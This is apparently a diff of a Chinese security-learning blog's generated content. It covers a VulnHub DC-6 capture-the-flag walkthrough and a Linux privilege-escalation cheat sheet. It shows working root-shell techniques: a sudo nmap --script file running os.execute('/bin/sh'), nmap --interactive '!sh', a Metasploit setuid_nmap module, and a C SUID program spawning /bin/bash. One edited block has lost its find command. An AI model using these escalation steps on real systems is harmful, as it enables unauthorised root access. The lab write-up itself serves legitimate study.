+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">先写入一条命令</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br><span class="line">再<span class="params">--script</span>参数，执行</span><br><span class="line">sudo nmap <span class="params">--script=getshell</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>查看一下靶机的<code>nmap</code>版本</p>
+<p><code>7.4</code>还是挺高的</p>
+<p><img src="/2022/08/29/vulnhub/image-20221011131514173.png" alt="image-20221011131514173"></p>
+<p>那我们写一个脚本，里面加上命令，再用新版<code>nmap</code>运行这个脚本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">注意哈，jens只有在~目录下才可以执行<span class="built_in">echo</span>命令，不然是不可以的</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011132114963.png" alt="image-20221011132114963"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">sudo nmap <span class="attribute">--script</span>=getshell</span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/08/29/vulnhub/image-20221011132315607.png" alt="image-20221011132315607"></p>
+<p>成功提权，然后我们查找<code>flag</code>【没输入回显有点小难受，但是不影响拿<code>flag</code>】</p>
+<p><img src="/2022/08/29/vulnhub/image-20221011132507052.png" alt="image-20221011132507052"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TAP"><figure class="iseeu highlight /tap"><table><tr><td class="code"><pre><span class="line">Yb        dP<span class="number"> 888888 </span>88    <span class="number"> 88 </span>        8888b.   dP&quot;Yb  88b<span class="number"> 88 </span>888888 d8b </span><br><span class="line"> Yb  db  dP  88__  <span class="number"> 88 </span>   <span class="number"> 88 </span>         8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;  <span class="number"> 88 </span> .o<span class="number"> 88 </span> .o      8I  dY Yb   dP<span class="number"> 88 </span>Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP   <span class="number"> 888888 </span>88ood8 88ood8     8888Y&quot;   YbodP <span class="number"> 88 </span> Y8<span class="number"> 888888 </span>(8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-6.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br><span class="line"></span><br><span class="line">意思是：</span><br><span class="line">Yb        dP<span class="number"> 888888 </span>88    <span class="number"> 88 </span>        8888b.   dP&quot;Yb  88b<span class="number"> 88 </span>888888 d8b </span><br><span class="line"> Yb  db  dP  88__  <span class="number"> 88 </span>   <span class="number"> 88 </span>         8I  Yb dP   Yb 88Yb88 88__   Y8P </span><br><span class="line">  YbdPYbdP   88&quot;&quot;  <span class="number"> 88 </span> .o<span class="number"> 88 </span> .o      8I  dY Yb   dP<span class="number"> 88 </span>Y88 88&quot;&quot;   `&quot;&#x27; </span><br><span class="line">   YP  YP   <span class="number"> 888888 </span>88ood8 88ood8     8888Y&quot;   YbodP <span class="number"> 88 </span> Y8<span class="number"> 888888 </span>(8) </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">恭喜！！！</span><br><span class="line"></span><br><span class="line">希望你喜欢 DC-6。只是想向所有这些人表示衷心的感谢</span><br><span class="line">谁提供了反馈，谁花时间完成了这些小事</span><br><span class="line">挑战。</span><br><span class="line"></span><br><span class="line">如果你喜欢这个 CTF，请通过@DCAU7 给我发一条推文。</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>一个旗子找完，游戏结束</strong></p>
+<hr>
 ]]></content>
       <categories>
         <category>网络安全学习</category>
@@ -3950,7 +4144,7 @@ file_get_contents() 函数是用于将文件的内容读入到一个字符串中
 
 <hr>
 <h4 id="关键"><a href="#关键" class="headerlink" title="*关键"></a>*关键</h4><p>1.查看具有root用户权限的SUID二进制可执行文件</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm <span class="attribute">-u</span>=s -type f 2&gt;/dev/<span class="literal">null</span></span><br><span class="line"></span><br><span class="line">命令来查找拥有SUID权限的程序。</span><br><span class="line"></span><br><span class="line">perm指定权限，<span class="attribute">-u</span>=s代表SUID权限，type指定文件类型，f表示常规文件</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELM"><figure class="iseeu highlight /elm"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">命令来查找拥有<span class="type">SUID</span>权限的程序。</span><br><span class="line"></span><br><span class="line"><span class="title">perm</span>指定权限，-u=s代表<span class="type">SUID</span>权限，<span class="keyword">type</span>指定文件类型，f表示常规文件</span><br></pre></td></tr></table></figure></div>
 
 <p>2.已知的可用来提权的linux可执行的文件列表如下</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOS"><figure class="iseeu highlight /dos"><table><tr><td class="code"><pre><span class="line">Nmap、Vim、<span class="built_in">find</span>、Bash、<span class="built_in">More</span>、Less、Nano、cp</span><br></pre></td></tr></table></figure></div>
@@ -3980,7 +4174,21 @@ file_get_contents() 函数是用于将文件的内容读入到一个字符串中
 <p>vim编辑后保存时用wq!强制保存，vim运行时虽然是root权限，但wq依然会提示只读。</p>
 <p>随后sudo bash就会获取一个root的shell。</p>
 <p><img src="/2022/05/31/daily/image-20220830134159252.png" alt="image-20220830134159252"></p>
-<h5 id="（4）利用脚本获取root权限shell"><a href="#（4）利用脚本获取root权限shell" class="headerlink" title="（4）利用脚本获取root权限shell"></a>（4）利用脚本获取root权限shell</h5><p>除了系统的一些可执行命令，自己写的可执行文件也可添加SUID权限。不论c或者go或者其他语言都可以，这里以c为例。</p>
+<h5 id="（4）利用nmap获取root权限shell"><a href="#（4）利用nmap获取root权限shell" class="headerlink" title="（4）利用nmap获取root权限shell"></a>（4）利用nmap获取root权限shell</h5><h6 id="1-旧版"><a href="#1-旧版" class="headerlink" title="1.旧版"></a>1.旧版</h6><p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">nmap <span class="comment">--interactive</span></span><br></pre></td></tr></table></figure></div>
+
+<p>之后执行:</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span>&gt; !sh</span><br><span class="line"><span class="attribute">sh</span>-<span class="number">3</span>.<span class="number">2</span># whoami</span><br><span class="line"><span class="attribute">root</span></span><br></pre></td></tr></table></figure></div>
+
+<p>msf中的模块为：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">exploit<span class="regexp">/unix/</span>local/setuid_nmap</span><br></pre></td></tr></table></figure></div>
+
+<h6 id="2-新版"><a href="#2-新版" class="headerlink" title="2.新版"></a>2.新版</h6><p>较新版可使用 <code>--script</code> 参数：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">先写入一条命令</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;os.execute(&#x27;/bin/sh&#x27;)&quot;</span> &gt; getshell</span><br><span class="line">再<span class="params">--script</span>参数，执行</span><br><span class="line">sudo nmap <span class="params">--script=getshell</span></span><br></pre></td></tr></table></figure>
+
+<p>成功提权</p>
+<p><img src="/2022/05/31/daily/image-20221011132253611.png" alt="image-20221011132253611"></p>
+<h5 id="（5）利用脚本获取root权限shell"><a href="#（5）利用脚本获取root权限shell" class="headerlink" title="（5）利用脚本获取root权限shell"></a>（5）利用脚本获取root权限shell</h5><p>除了系统的一些可执行命令，自己写的可执行文件也可添加SUID权限。不论c或者go或者其他语言都可以，这里以c为例。</p>
 <p>示例代码如下：</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setuid(geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 
